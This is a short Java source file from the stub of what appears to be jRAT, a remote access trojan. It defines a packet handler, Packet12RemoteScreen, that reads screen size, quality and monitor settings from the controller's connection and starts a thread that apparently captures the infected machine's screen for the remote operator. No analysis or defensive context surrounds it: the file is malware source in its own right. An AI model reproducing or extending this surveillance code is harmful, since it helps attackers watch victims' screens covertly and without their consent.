package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Screen;

public class Packet12RemoteScreen extends AbstractIncomingPacket {
	
	private boolean repeat;
	
	public Packet12RemoteScreen() {
		this.repeat = true;
	}
	
	public Packet12RemoteScreen(boolean repeat) {
		this.repeat = repeat;
	}

	@Override
	public void read() throws Exception {
		int size = Connection.readInt();
		int quality = Connection.readInt();
		int monitor = Connection.readInt();
		
		new Thread(new Screen(repeat, size, quality, monitor)).start();
	}

}
